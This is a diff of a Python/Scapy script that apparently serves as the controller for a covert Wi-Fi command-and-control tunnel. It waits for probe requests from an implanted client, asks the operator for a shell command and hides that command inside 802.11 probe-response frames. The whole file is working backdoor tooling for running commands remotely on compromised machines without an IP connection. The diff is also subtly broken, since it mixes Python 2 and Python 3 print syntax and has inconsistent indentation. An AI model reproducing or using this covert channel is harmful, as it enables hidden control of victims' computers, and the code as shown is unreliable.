@@ -4,9 +4,9 @@ import binascii
 import time
 
 #设置ssid和监听设备名
-netSSID = 'ghost'       #AP名字
-iface = 'wlan0'         #网卡名字
-times=300               #发送帧的数量
+netSSID = 'ghost'       #Network name here
+iface = 'wlan0'         #Interface name here
+
 #Scapy参考设置
 #beacon = Dot11Beacon(cap='ESS+privacy')
 #essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
@@ -23,45 +23,46 @@ times=300               #发送帧的数量
 
 #命令获取函数
 def getCmd():
-    cmd = raw_input("#>: ")
-    # cmd = "cmd /c notepad"
+    cmd = raw_input("input the command to excute:\n")
+    #cmd_b = "cmd /c notepad"
     #处理命令编码,转为16进制
     cmd_b = ""
     for i in cmd:
         cmd_b += binascii.a2b_hex(hex(ord(i))[2:4])
-    print cmd_b
+    cmd_b += '\0'
+    print(cmd_b)
     return cmd_b
-
-#命令封装为dot11elt帧
-def getEltPayload(cmd):
-    return Dot11Elt(ID=221, info=('\x63\x63\x63'+cmd))
-
+def getTimeHash():
+    hash_time = str(hash(time.time()))[0:8]
+    print hash_time
+    return hash_time
 #封装为dot11完整帧
 def getPayloadFrame(cmd, ct_addr2, addr2, addr3):
-    payload = getEltPayload(cmd)
+    payload = Dot11Elt(ID=221, info=('\x63\x63\x63'+getTimeHash()+cmd)) #命令封装为dot11elt帧
     response_dot11 = Dot11(subtype=5, addr1=ct_addr2,
     addr2=addr2, addr3=addr2,SC=22222)
-    return RadioTap()/response_dot11/Dot11ProbeResp()/Dot11Elt(ID='SSID', info="yunsle_ghost_tunnel")/payload
+    return RadioTap()/response_dot11/Dot11ProbeResp()/payload/Dot11Elt(ID='SSID', info="ghost")
 
 #发送包含控制指令的dot11帧
 def sendCmd(frame):
     for i in range(0,3):
-        sendp(frame, iface=iface, count=times)
+        sendp(frame, iface=iface, count=500)
 
 #处理控制函数
 def handle(packet):
+
     dot = packet.getlayer(Dot11)
+    #print(dot)
     if dot!=None and dot.type==0 and dot.subtype==4:
         #帧数据转为字符串
         data=str(packet)
         #寻找客户端request帧携带的特定标识
+
         if data.find("command")>=0:
             # packet.show()
-            print "[+]Target online"
+            print("#wake up#\n")
             #获取上线被控端的MAC地址
             ct_addr2 = packet.addr2
-            print 'MAC[%s]'%ct_addr2
-            
             #要执行的命令
             cmd = getCmd();
             #命令封装为802.11完整帧
@@ -70,16 +71,12 @@ def handle(packet):
             #参数3、4：发送帧中的addr2和addr3的MAC地址
             response_frame = getPayloadFrame(cmd, ct_addr2, '22:22:22:22:22:22', '33:33:33:33:33:33')
             #发送包含控制命令的Response帧
-            sendCmd(response_frame)
+            #sendCmd(response_frame)
+	    sendp(response_frame, iface=iface, count=700)
             #这里只要发送完毕既退出
-            exit(1)
-def banner():
-    print'''
-        [!] Please turn Interface into monitor mode
-        [*] Command: iwconfig wlan0 mode monitors
-    '''
+            #exit(1)
+
 if __name__ == "__main__":
-    banner()
-    print "waiting for wake up......."
+    print("waiting for wake up.......")
     #监听函数
     sniff(iface=iface, prn=handle)
